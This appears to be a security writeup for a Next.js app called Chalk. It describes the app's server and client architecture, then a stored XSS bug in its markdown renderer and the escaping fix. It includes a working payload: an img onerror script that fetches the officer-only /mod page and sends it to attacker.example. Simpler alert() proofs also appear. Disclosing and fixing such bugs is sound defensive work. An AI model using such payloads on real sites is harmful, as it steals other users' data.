# Chalk — architecture walkthrough & security writeup

## How the running app is wired

### Server vs. browser
Chalk is a Next.js App Router project. Almost everything runs **on the server**:

- **Server Components** — `app/layout.js`, `app/page.js` (the wall), `app/compose/page.js`,
  `app/login`, `app/register`, `app/mod/page.js`. These are `async` functions that run on the
  server, read the SQLite database directly, and stream finished HTML to the browser. There is no
  client-side data fetching.
- **Server Actions** — `lib/actions.js` (`"use server"`): `loginAction`, `logoutAction`,
  `registerAction`, `createPostAction`, `deletePostAction`, and the `currentUser()` helper. Forms
  submit straight to these; they run on the server, touch cookies and the DB, and `redirect()`.
- **Library code** — `lib/db.js` (SQLite via `node:sqlite`), `lib/auth.js` (sessions/passwords),
  `lib/markdown.js` (post rendering), `lib/seed.js` (first-run demo data). Server only.
- **Client Components** — only two, marked `"use client"`: `components/LogoutButton.js` (a tiny
  form) and `components/PostBody.js`. `PostBody` renders post HTML with **`dangerouslySetInnerHTML`**
  — this is the only place server-produced markup is injected into the DOM, and it is the sink for
  the bug below.

The database, password hashes, session tokens, and the officer desk notes never leave the server
except as rendered HTML.

### How a session cookie becomes `currentUser`
1. On login/register, `createSession(userId)` (`lib/auth.js`) generates a random 24-byte hex token,
   stores `(token, user_id)` in the `sessions` table, and `actions.js` sets it as the
   `chalk_session` cookie (`sameSite: lax`, 14-day `maxAge`).
2. On any request, `currentUser()` reads `cookies().get("chalk_session")` and calls
   `userFromToken(token)`, which `JOIN`s `sessions → users` and returns
   `{ id, email, display_name, role }` or `null`.
3. Every page/layout calls `currentUser()` to decide what to render. The cookie is just a lookup
   key; the trusted identity (including `role`) always comes from the DB row.

### How a post body reaches the wall
1. `app/compose/page.js` renders a `<form action={createPostAction}>` with a `body` textarea.
2. `createPostAction` (server) checks `currentUser()`, validates length (3–2000), then
   `INSERT INTO posts (user_id, body) VALUES (?, ?)` — the body is stored **verbatim**.
3. `app/page.js` selects posts, and for each one calls `renderMarkdown(post.body)` and passes the
   result to `<PostBody html={...} />`, which injects it via `dangerouslySetInnerHTML`.

### What an officer can see that a member cannot
- **Officer desk (`/mod`)** — role-gated in `app/mod/page.js`: members get a "this is for officers"
  stub; officers get the `officer_desk` rows (the seed stores a cage lock combination `18-24-09`
  and an after-hours line `x4419`). The nav link to `/mod` only appears for `role === "officer"`.
- **Moderation** — `deletePostAction` lets officers take down *anyone's* post; members can only
  delete their own. The "Take down" button is shown accordingly.

Roles are enforced server-side on every request, so hiding the nav link is cosmetic — the `/mod`
gate is the real control. That gate is sound **on its own**; the defect below is what lets a member
get around it anyway.

## The defect: stored XSS in the post renderer

**Where:** `lib/markdown.js`. `renderMarkdown` ran the raw post body through a chain of regex
replacements but **never HTML-escaped it**. The file even had a stub named `escapeUnused` that just
returned its input unchanged. The output is injected with `dangerouslySetInnerHTML`
(`components/PostBody.js`), so any HTML in a post body became live markup in every visitor's browser.

**Severity:** stored (persistent) XSS. Anyone can self-register with any `.edu` address and become a
member, so this is exploitable by an unauthenticated attacker who signs up.

### How to trigger it (before the patch)
1. Register or sign in as a member (e.g. `maya@campus.edu` / `campus123`).
2. Go to **Post** and submit this body:
   ```
   Totally normal post <img src=x onerror="fetch('/mod').then(r=>r.text()).then(t=>new Image().src='https://attacker.example/steal?d='+encodeURIComponent(t))"> and **bold** still here.
   ```
3. Visit the wall (`/`). The server streamed the raw `<img ... onerror=...>` tag into the page (I
   confirmed the exact bytes on the running server). The image fails to load, `onerror` fires, and
   the script runs in the browser of **whoever views the wall**.

Because it runs in the victim's session, an **officer** who opens the wall executes it with their
cookie: the payload above fetches `/mod` and exfiltrates the officer-only cage combination to an
attacker server. A member has now read what only officers were supposed to see — defeating the one
privilege boundary the app has. Simpler proofs like
`<img src=x onerror=alert(document.domain)>` or `<script>alert(1)</script>` also fire.

### The fix
`lib/markdown.js` now HTML-escapes the raw body **first** (`&`, `<`, `>`, `"`, `'`), then splices in
its own trusted tags. Because escaping happens before the markdown transforms, user-typed angle
brackets become `&lt;`/`&gt;` (inert text) while `**bold**`, `*italic*`, `` `code` ``, `##` headings,
`- ` lists, and `[label](url)` links still render exactly as before. Links additionally pass through
`safeUrl()`, which allows `http(s):`, `mailto:`, and site-relative URLs but drops `javascript:` /
`data:` schemes (so a link can't reintroduce script). The relative seed link `[team handbook](/mod)`
and normal `https://…` links are unaffected.

### Verification (on the running server)
- The same payload now serves as `XSSPROBE &lt;img src=x onerror=…&gt;` — inert text, `0`
  executable `onerror` tags on the wall.
- `**bold**` → `<strong>`, `## Shop hours` → `<h2>`, `- one / - two` → `<ul><li>…`,
  `[h](https://ex.edu)` → a working link. Normal markdown is intact.

Root cause was a missing output-encoding step, so the fix is confined to the one rendering helper;
no schema, action, or auth changes were needed.
